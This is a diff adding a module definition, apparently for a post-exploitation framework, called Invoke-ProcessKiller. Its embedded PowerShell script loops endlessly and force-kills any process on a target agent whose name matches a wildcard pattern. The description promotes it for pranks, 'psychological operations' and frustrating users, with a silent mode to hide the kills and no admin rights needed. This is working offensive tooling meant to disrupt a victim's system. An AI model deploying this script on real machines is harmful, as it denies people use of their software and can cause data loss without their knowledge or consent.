@@ -1,0 +1,80 @@
+name: Invoke-ProcessKiller
+authors:
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: Continuously monitors the target system for processes matching a specified
+  name and immediately terminates them upon detection, effectively preventing targeted
+  applications from running. This module leverages PowerShell to watch for process
+  creation events and forcefully kills any process whose name matches the provided
+  pattern, supporting wildcards for broad targeting. The technique is useful for
+  pranks, psychological operations, or disruptive demonstrations, as it can frustrate
+  users by making specific programs impossible to launch. Operators can use this
+  module to block games, productivity tools, or any application of interest, with
+  optional silent operation to avoid alerting the user. No administrative privileges
+  are required, making it effective in a wide range of environments. Use responsibly,
+  as repeated process termination can disrupt user productivity and may result in
+  data loss if critical applications are targeted.
+software: ''
+tactics: [TA0040]
+techniques: [T1489]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments: []
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: ProcessName
+    description: Process name to kill on starting (wildcards accepted).
+    required: true
+    value: ''
+  - name: Sleep
+    description: Time to sleep between checks.
+    required: true
+    value: '1'
+  - name: Silent
+    description: Don't output kill messages.
+    required: false
+    value: 'False'
+    strict: true
+    suggested_values:
+      - True
+      - False
+script: |
+  function Invoke-ProcessKiller {
+      [CmdletBinding()]
+      Param (
+          [Parameter(Mandatory = $True, Position = 0)]
+          [ValidateNotNullOrEmpty()]
+          [String]
+          $ProcessName,
+
+          [Parameter(Position = 1)]
+          [Int]
+          $Sleep = 1,
+
+          [Parameter(Position = 2)]
+          [Switch]
+          $Silent
+      )
+
+      "Invoke-ProcessKiller monitoring for $ProcessName every $Sleep seconds"
+
+      while($true){
+          Start-Sleep $Sleep
+
+          Get-Process $ProcessName | % {
+              if (-not $Silent) {
+                  "`n$ProcessName process started, killing..."
+              }
+              Stop-Process $_.Id -Force
+          }
+      }
+  }
+script_end: Invoke-ProcessKiller {{ PARAMS }}
